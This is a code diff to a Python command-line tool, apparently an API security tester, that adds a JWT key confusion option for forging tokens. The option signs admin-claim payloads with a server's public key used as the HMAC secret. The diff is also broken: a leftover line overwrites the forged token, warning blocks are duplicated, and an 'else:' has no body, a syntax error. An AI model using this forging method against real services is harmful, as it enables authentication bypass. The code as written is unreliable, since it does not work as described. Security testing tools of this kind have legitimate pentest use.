@@ -4363,14 +4363,20 @@ def jwt_decode_cmd(ctx, token):
 @click.argument('payload')
 @click.option('--header', default='{"alg":"HS256","typ":"JWT"}', help='JWT header as JSON string')
 @click.option('--secret', default='secret', help='Secret key for signing (default: "secret")')
+@click.option('--public-key', 'public_key_file', type=click.Path(),
+              help='PEM public key file to use as HMAC secret (RS256→HS256 key confusion attack). '
+                   'When provided, --secret is ignored and the raw DER bytes of the key are used.')
 @click.pass_context
-def jwt_encode_cmd(ctx, payload, header, secret):
+def jwt_encode_cmd(ctx, payload, header, secret, public_key_file):
     """Encode a JWT token with custom payload and header
-    
+
     \b
     Examples:
       python apileaks.py jwt encode '{"sub":"user123","role":"user"}'
       python apileaks.py jwt encode '{"sub":"admin"}' --secret mysecret
+      python apileaks.py jwt encode '{"sub":"admin","admin":1}' \\
+          --header '{"alg":"HS256","typ":"JWT"}' \\
+          --public-key public.pem
     """
     try:
         # Parse JSON strings
@@ -4379,12 +4385,45 @@ def jwt_encode_cmd(ctx, payload, header, secret):
         except json.JSONDecodeError:
             click.echo("❌ Error: Header must be valid JSON", err=True)
             sys.exit(1)
-        
+
         try:
             payload_dict = json.loads(payload)
         except json.JSONDecodeError:
             click.echo("❌ Error: Payload must be valid JSON", err=True)
             sys.exit(1)
+
+        is_none_alg = header_dict.get('alg', '').lower() == 'none'
+
+        # --public-key: key confusion attack — sign with raw DER bytes of the
+        # public key as the HMAC secret, exactly as vulnerable libraries do.
+        if public_key_file:
+            from cryptography.hazmat.primitives.serialization import (
+                load_pem_public_key, Encoding, PublicFormat
+            )
+            from cryptography.hazmat.backends import default_backend
+            try:
+                pem_data = Path(public_key_file).read_bytes()
+                pub_key = load_pem_public_key(pem_data, backend=default_backend())
+                # DER-encode the public key (SubjectPublicKeyInfo / PKCS#8 format)
+                der_bytes = pub_key.public_bytes(Encoding.DER, PublicFormat.SubjectPublicKeyInfo)
+            except Exception as exc:
+                click.echo(f"❌ Could not load public key from {public_key_file}: {exc}", err=True)
+                sys.exit(1)
+
+            # Build token manually using raw DER bytes as HMAC key
+            import base64 as _b64
+            def _b64url(data: bytes) -> str:
+                return _b64.urlsafe_b64encode(data).rstrip(b'=').decode()
+
+            h_enc = _b64url(json.dumps(header_dict, separators=(',', ':')).encode())
+            p_enc = _b64url(json.dumps(payload_dict, separators=(',', ':')).encode())
+            msg = f"{h_enc}.{p_enc}".encode()
+            sig = hmac.new(der_bytes, msg, hashlib.sha256).digest()
+            token = f"{h_enc}.{p_enc}.{_b64url(sig)}"
+            secret_label = f"<DER bytes of {public_key_file}>"
+        else:
+            token = encode_jwt(header_dict, payload_dict, secret)
+            secret_label = secret
         
         # Encode JWT
         token = encode_jwt(header_dict, payload_dict, secret)
@@ -4393,6 +4432,12 @@ def jwt_encode_cmd(ctx, payload, header, secret):
         click.echo("JWT Token Generated")
         click.echo("="*60)
 
+        if is_none_alg:
+            click.echo(click.style("\n⚠️  alg:none — no signature generated (trailing dot only)", fg='yellow'))
+        elif public_key_file:
+            click.echo(click.style(f"\n🔑 Key confusion: signed with DER bytes of {public_key_file}", fg='yellow'))
+        else:
+            click.echo(f"\n🔑 Secret Used: {secret_label}")
         is_none_alg = header_dict.get('alg', '').lower() == 'none'
         if is_none_alg:
             click.echo(click.style("\n⚠️  alg:none — no signature generated (trailing dot only)", fg='yellow'))
@@ -4403,6 +4448,12 @@ def jwt_encode_cmd(ctx, payload, header, secret):
         click.echo("🔐 Payload: " + click.style(json.dumps(payload_dict), fg=JWT_PAYLOAD_COLOR))
         click.echo(f"\n🎫 Generated Token:")
         click.echo("-" * 20)
+        click.echo(colorize_jwt(decode_jwt(token)))
+        if is_none_alg:
+            click.echo("  " + click.style("■ header", fg=JWT_HEADER_COLOR, bold=True)
+                       + "  " + click.style("■ payload", fg=JWT_PAYLOAD_COLOR, bold=True)
+                       + "  " + click.style("■ (no signature)", fg=JWT_SIGNATURE_COLOR, bold=True))
+        else:
         if is_none_alg:
             # Print raw token — colorize_jwt would fail on empty signature
             click.echo(token)
@@ -4412,7 +4463,7 @@ def jwt_encode_cmd(ctx, payload, header, secret):
                        + "  " + click.style("■ payload", fg=JWT_PAYLOAD_COLOR, bold=True)
                        + "  " + click.style("■ signature", fg=JWT_SIGNATURE_COLOR, bold=True))
         click.echo("\n" + "="*60)
-        
+
     except ValueError as e:
         click.echo(f"❌ Error encoding JWT: {e}", err=True)
         sys.exit(1)
